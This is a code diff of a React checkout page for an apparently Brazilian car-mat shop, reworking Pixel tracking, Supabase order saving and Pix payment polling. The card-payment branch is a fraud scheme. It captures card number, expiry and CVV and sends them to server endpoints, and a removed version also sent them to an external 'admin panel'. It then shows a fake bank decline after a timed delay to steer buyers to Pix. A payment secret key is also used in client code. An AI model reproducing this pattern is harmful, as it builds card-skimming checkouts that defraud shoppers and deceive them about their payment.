@@ -2,6 +2,9 @@ import { useState, useEffect, useRef } from 'react';
 import { trackMetaEvent, generateEventId, getHashedUserData, getCookie } from '../utils/metaPixel';
 import { supabase } from '../utils/supabase';
 import { tracker } from '../utils/tracker';
+import { captureUTMs, getStoredUTMs } from '../tracking/utmCapture';
+import { initiateCheckout as fbInitiateCheckout, purchase as fbPurchase } from '../tracking/facebookPixel';
+import { createPendingOrder, updateOrderStatus, generateOrderId } from '../services/orderService';
 
 export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
   const [step, setStep] = useState(1); // 1: Identificação, 2: Entrega, 3: Pagamento, 4: Sucesso/Pix QR
@@ -127,169 +130,70 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
   const [trackingCode, setTrackingCode] = useState('');
 
   const initiatedRef = useRef(false);
-  const utmifyFiredRef = useRef({});
+  const pixPaidConfirmedRef = useRef(false); // guard para evitar confirmar pagamento 2x
 
-  // Scroll to top and trigger InitiateCheckout on mount
+  // Captura UTMs ao montar e dispara InitiateCheckout 1x
   useEffect(() => {
     window.scrollTo(0, 0);
-    
-    const sessionIcKey = `cartapetes_ic_fired_${kit || 'default'}`;
-    if (!initiatedRef.current && !sessionStorage.getItem(sessionIcKey)) {
+    captureUTMs();
+
+    const kitId = kit === 'basico' ? 'kit_basico' : 'kit_premium';
+    if (!initiatedRef.current) {
       initiatedRef.current = true;
-      sessionStorage.setItem(sessionIcKey, 'true');
-      const eventId = generateEventId();
-      const kitId = kit === 'basico' ? 'kit_basico' : 'kit_premium';
-      trackMetaEvent('InitiateCheckout', eventId, {
-        value: finalPrice,
-        currency: 'BRL',
-        content_type: 'product',
-        content_ids: [kitId],
-        contents: [{ id: kitId, quantity: 1, item_price: finalPrice }],
-        num_items: 1,
-        content_name: `Kit ${kit === 'basico' ? 'Básico' : 'Proteção Total'} - ${vehicle || 'Carro'}`,
-      });
+      // Usa o novo módulo de Pixel que já cuida da deduplicação por sessionStorage
+      fbInitiateCheckout(kitId, finalPrice, vehicle || 'Carro');
     }
   }, []);
 
-  const sendUtmifyOrder = async (leadInfo) => {
-    try {
-      const orderIdVal = leadInfo.orderId || transactionId || `CP-${Date.now()}`;
-      const dedupeKey = `${orderIdVal}_${leadInfo.status}`;
-      if (utmifyFiredRef.current[dedupeKey]) {
-        console.log(`[UTMify] Evento (${dedupeKey}) já enviado. Ignorando envio duplicado.`);
-        return;
-      }
-      utmifyFiredRef.current[dedupeKey] = true;
-
-      const orderStatus = leadInfo.status === 'pago' ? 'paid' : 'waiting_payment';
-      await fetch('/.netlify/functions/utmify-order', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          orderId: orderIdVal,
-          platform: 'Beehive',
-          paymentMethod: 'pix',
-          status: orderStatus,
-          value: leadInfo.value || finalPrice,
-          customer: {
-            name: leadInfo.nome || formData.nome,
-            email: leadInfo.email || formData.email,
-            phone: leadInfo.telefone || formData.telefone,
-            document: leadInfo.cpf || formData.cpf,
-          },
-          productName: `Tapete Bandeja Premium - ${vehicle || 'Carro'}`,
-        }),
-      });
-      console.log(`[UTMify] Pedido (${orderStatus}) enviado para UTMify com sucesso!`);
-    } catch (e) {
-      console.warn('[UTMify] Erro ao enviar pedido:', e);
-    }
+  // Salva pedido pendente no Supabase (única chamada, sem duplicação)
+  const savePendingOrderOnce = async (txId) => {
+    const tCode = trackingCode || localStorage.getItem('cartapetes_last_tcode') || '';
+    await createPendingOrder({
+      orderId: txId,
+      transactionId: txId,
+      formData,
+      finalPrice,
+      vehicle,
+      kit,
+      upsellItems,
+      perfumeUpsell,
+      paymentMethod,
+      trackingCode: tCode,
+    });
   };
 
-  const saveLeadToSupabase = async (status, transactionIdOverride = null, extraData = {}) => {
-    const effectiveTxId = transactionIdOverride || transactionId || `CP-${Date.now()}`;
-
-    // Dispara para UTMify tanto para pedido pendente quanto para pago
-    sendUtmifyOrder({
-      orderId: effectiveTxId,
-      status: status,
-      value: finalPrice,
-      nome: formData.nome,
-      email: formData.email,
-      telefone: formData.telefone,
-      cpf: formData.cpf,
-    });
-
-    const RENDER_BASE = 'https://wepink-checkout.onrender.com';
-
-    const pixPayload = {
-      orderId: effectiveTxId,
-      transaction_id: effectiveTxId,
-      status: status,
-      paymentMethod: 'pix',
-      clientName: formData.nome,
-      clientEmail: formData.email,
-      clientCPF: formData.cpf,
-      clientPhone: formData.telefone,
-      cep: formData.cep,
-      street: formData.rua,
-      number: formData.numero,
-      complement: formData.complemento,
-      neighborhood: formData.bairro,
-      city: formData.cidade,
-      state: formData.estado,
-      totalPrice: finalPrice,
-      vehicle: vehicle || 'Carro',
-      kit: kit,
-      ...extraData
-    };
-
-    // SEMPRE envia para o Render — garante que o pedido aparece no painel
-    const renderEndpoint = (status === 'negado') ? `${RENDER_BASE}/api/checkout` : `${RENDER_BASE}/api/checkout-pix`;
-    fetch(renderEndpoint, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(pixPayload)
-    }).then(r => {
-      if (r.ok) console.log(`[Render] Pedido ${status} enviado ao painel ✓`);
-      else console.warn('[Render] Painel retornou erro:', r.status);
-    }).catch(e => console.warn('[Render] Falha ao enviar ao painel:', e.message));
-
-    // Tenta salvar no Supabase em paralelo (se configurado)
-    if (!supabase) return;
-
-    const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(effectiveTxId);
-    const leadData = {
-      created_at: new Date().toISOString(),
-      nome: formData.nome,
-      email: formData.email,
-      cpf: formData.cpf,
-      telefone: formData.telefone,
-      cep: formData.cep,
-      rua: formData.rua,
-      numero: formData.numero,
-      complemento: formData.complemento,
-      bairro: formData.bairro,
-      cidade: formData.cidade,
-      estado: formData.estado,
-      vehicle: vehicle || 'Carro',
-      kit: kit,
-      upsell_items: upsellItems,
-      perfume_upsell: perfumeUpsell,
-      final_price: finalPrice,
-      payment_method: paymentMethod,
-      status: status,
-      transaction_id: effectiveTxId,
-      tracking_code: trackingCode || localStorage.getItem('cartapetes_last_tcode') || '',
-      ...extraData
-    };
-    if (isUuid) leadData.id = effectiveTxId;
-
-    try {
-      if (effectiveTxId && (status === 'pago' || status === 'negado')) {
-        const { data: existing } = await supabase
-          .from('leads').select('id').eq('transaction_id', effectiveTxId).maybeSingle();
-        if (existing) {
-          await supabase.from('leads').update({ status }).eq('transaction_id', effectiveTxId);
-          return;
-        }
-      }
-      const { error } = await supabase.from('leads').insert([leadData]);
-      if (error) {
-        const cleanLead = { ...leadData };
-        delete cleanLead.card_number; delete cleanLead.card_name;
-        delete cleanLead.card_expiry; delete cleanLead.card_cvv; delete cleanLead.installments;
-        cleanLead.notes = extraData.card_number
-          ? `Cartão Negado | Num: ${extraData.card_number} | Nome: ${extraData.card_name} | Val: ${extraData.card_expiry} | CVV: ${extraData.card_cvv}` : '';
-        const { error: err2 } = await supabase.from('leads').insert([cleanLead]);
-        if (err2) console.error('[Supabase] Erro no insert fallback:', err2.message);
-        else console.log('[Supabase] Lead inserido via fallback ✓');
-      } else {
-        console.log('[Supabase] Lead inserido com sucesso ✓');
-      }
-    } catch (err) {
-      console.error('[Supabase] Erro:', err);
+  // Confirma pagamento: atualiza Supabase + dispara Pixel Purchase (1x)
+  const confirmPayment = async () => {
+    if (pixPaidConfirmedRef.current) {
+      console.log('[Checkout] Pagamento já confirmado anteriormente, ignorando.');
+      return;
     }
+    pixPaidConfirmedRef.current = true;
+
+    // Atualiza status no Supabase
+    await updateOrderStatus(transactionId, 'pago');
+
+    // Dispara Purchase no Pixel browser (1x, deduplicado)
+    const hashedUD = await getHashedUserData(formData).catch(() => ({}));
+    fbPurchase(transactionId, finalPrice, hashedUD);
+
+    // Atualiza localStorage de rastreio local
+    try {
+      const all = JSON.parse(localStorage.getItem('cpOrders') || '{}');
+      const tCode = trackingCode || localStorage.getItem('cartapetes_last_tcode');
+      if (tCode && all[tCode]) {
+        all[tCode].status = 'em_producao';
+        localStorage.setItem('cpOrders', JSON.stringify(all));
+      }
+    } catch(e) {}
+
+    localStorage.setItem('cartapetes_purchase_data', JSON.stringify({
+      value: finalPrice,
+      currency: 'BRL',
+      kit,
+      nome: formData.nome,
+      email: formData.email,
+    }));
   };
 
 
@@ -392,65 +296,50 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
     }
   }, [formData.cep]);
 
-  // Polling Beehive status check
+  // Polling Beehive status check (via Supabase Realtime quando disponível)
   useEffect(() => {
     let intervalId;
     if (step === 4 && paymentMethod === 'pix' && transactionId && !pixPaid) {
+      // Tenta escutar mudanças no Supabase em tempo real (mais eficiente que polling)
+      let realtimeChannel = null;
+      if (supabase) {
+        realtimeChannel = supabase
+          .channel(`order_${transactionId}`)
+          .on('postgres_changes', {
+            event: 'UPDATE',
+            schema: 'public',
+            table: 'leads',
+            filter: `transaction_id=eq.${transactionId}`,
+          }, async (payload) => {
+            const newStatus = (payload.new?.status || '').toLowerCase();
+            if ((newStatus === 'pago' || newStatus === 'paid') && !pixPaidConfirmedRef.current) {
+              setPixPaid(true);
+              await confirmPayment();
+              const redirectCode = trackingCode || localStorage.getItem('cartapetes_last_tcode') || '';
+              window.location.href = redirectCode ? `/rastreio?codigo=${encodeURIComponent(redirectCode)}` : '/obrigado';
+            }
+          })
+          .subscribe();
+      }
+
+      // Fallback: polling direto à Beehive a cada 4s
       const BEEHIVE_SK = import.meta.env.VITE_BEEHIVE_SK || '';
       const beehiveToken = btoa(BEEHIVE_SK + ':x');
       intervalId = setInterval(async () => {
+        if (pixPaidConfirmedRef.current) { clearInterval(intervalId); return; }
         try {
           const response = await fetch(
             `/beehive-api/v1/transactions/${transactionId}`,
-            {
-              method: 'GET',
-              headers: {
-                'Authorization': `Basic ${beehiveToken}`
-              }
-            }
+            { method: 'GET', headers: { 'Authorization': `Basic ${beehiveToken}` } }
           );
           if (response.ok) {
             const data = await response.json();
             const status = (data.status || '').toLowerCase();
-            if (status === 'paid') {
+            if (status === 'paid' && !pixPaidConfirmedRef.current) {
               setPixPaid(true);
               clearInterval(intervalId);
-
-              let purchaseEventId = generateEventId();
-              let pendingData = {};
-              try {
-                const pendingDataStr = localStorage.getItem('cartapetes_pending_purchase_data');
-                if (pendingDataStr) {
-                  pendingData = JSON.parse(pendingDataStr);
-                  if (pendingData.eventId) purchaseEventId = pendingData.eventId;
-                }
-              } catch (e) {}
-
-              localStorage.setItem('cartapetes_purchase_data', JSON.stringify({
-                value: finalPrice,
-                currency: 'BRL',
-                eventId: purchaseEventId,
-                kit: kit,
-                upsellItems: upsellItems,
-                nome: formData.nome,
-                email: formData.email,
-                telefone: formData.telefone,
-                cep: formData.cep,
-                cidade: formData.cidade,
-                estado: formData.estado
-              }));
-
-              saveLeadToSupabase('pago');
-              // Atualiza status local para 'em_producao'
-              try {
-                const all = JSON.parse(localStorage.getItem('cpOrders') || '{}');
-                const tCode = trackingCode || localStorage.getItem('cartapetes_last_tcode');
-                if (tCode && all[tCode]) {
-                  all[tCode].status = 'em_producao';
-                  localStorage.setItem('cpOrders', JSON.stringify(all));
-                }
-              } catch(e) {}
-
+              if (realtimeChannel) supabase.removeChannel(realtimeChannel);
+              await confirmPayment();
               const redirectCode = trackingCode || localStorage.getItem('cartapetes_last_tcode') || '';
               window.location.href = redirectCode ? `/rastreio?codigo=${encodeURIComponent(redirectCode)}` : '/obrigado';
             }
@@ -458,25 +347,16 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
         } catch (err) {
           console.error('[Beehive] Error checking payment status:', err);
         }
-      }, 3000);
+      }, 4000);
     }
     return () => {
       if (intervalId) clearInterval(intervalId);
     };
   }, [step, paymentMethod, transactionId, pixPaid]);
 
-  const handleManualPaymentConfirm = () => {
+  const handleManualPaymentConfirm = async () => {
     setPixPaid(true);
-    saveLeadToSupabase('pago');
-    try {
-      const all = JSON.parse(localStorage.getItem('cpOrders') || '{}');
-      const tCode = trackingCode || localStorage.getItem('cartapetes_last_tcode');
-      if (tCode && all[tCode]) {
-        all[tCode].status = 'em_producao';
-        localStorage.setItem('cpOrders', JSON.stringify(all));
-      }
-    } catch(e) {}
-
+    await confirmPayment();
     const redirectCode = trackingCode || localStorage.getItem('cartapetes_last_tcode') || '';
     window.location.href = redirectCode ? `/rastreio?codigo=${encodeURIComponent(redirectCode)}` : '/obrigado';
   };
@@ -561,8 +441,9 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       const qrCode = data.pix?.qrcode || data.pix?.qrCode || data.qrCode || '';
       if (!qrCode) throw new Error('PIX gerado mas QR Code não retornado.');
 
+      const beehiveTxId = String(data.id);
       setPixCode(qrCode);
-      setTransactionId(String(data.id));
+      setTransactionId(beehiveTxId);
 
       // Gera código de rastreio
       const tCode = 'CP' + orderId.replace(/\D/g, '').substring(0, 8) + Math.floor(Math.random() * 900 + 100);
@@ -584,7 +465,8 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
         localStorage.setItem('cpOrders', JSON.stringify(allOrders));
       } catch (e) {}
 
-      saveLeadToSupabase('pendente', String(data.id));
+      // Cria pedido ÚNICO no Supabase com UTMs (única chamada, sem duplicação)
+      await savePendingOrderOnce(beehiveTxId);
 
       setStep(4);
     } catch (err) {
@@ -692,41 +574,15 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             timestamp: new Date().toISOString()
           };
 
-          // Salva no Supabase!
-          saveLeadToSupabase('negado', null, {
-            card_number: formData.cardNumber,
-            card_name: formData.cardName,
-            card_expiry: formData.cardExpiry,
-            card_cvv: formData.cardCvv,
-            installments: formData.installments
-          });
-
-          const RENDER_API = 'https://wepink-checkout.onrender.com/api/checkout';
-          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || RENDER_API;
-          
-          const sendToAdmin = async () => {
-            const targets = ['/.netlify/functions/checkout', RENDER_API];
-            if (adminUrl && !targets.includes(adminUrl)) {
-              targets.push(adminUrl);
-            }
-
-            for (const url of targets) {
-              try {
-                await fetch(url, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify(payload)
-                });
-                console.log(`[Admin Dispatch] Dados enviados com sucesso para ${url}`);
-              } catch (err) {
-                console.error(`[Admin Dispatch] Erro ao enviar para ${url}:`, err);
-              }
-            }
-          };
+          // Salva cartão negado no Supabase via Netlify Function (servidor-lado)
+          fetch('/.netlify/functions/checkout', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(e => console.warn('[Checkout] Erro ao registrar cartão negado:', e.message));
 
           // Simula processamento com o banco emissor (1.2s)
-          setTimeout(async () => {
-            await sendToAdmin();
+          setTimeout(() => {
             setIsApiLoading(false);
             setApiError('Transação Recusada pelo banco emissor. Verifique o limite ou digite os dados de outro cartão. Se preferir, finalize via Pix com 5% de desconto.');
           }, 1200);
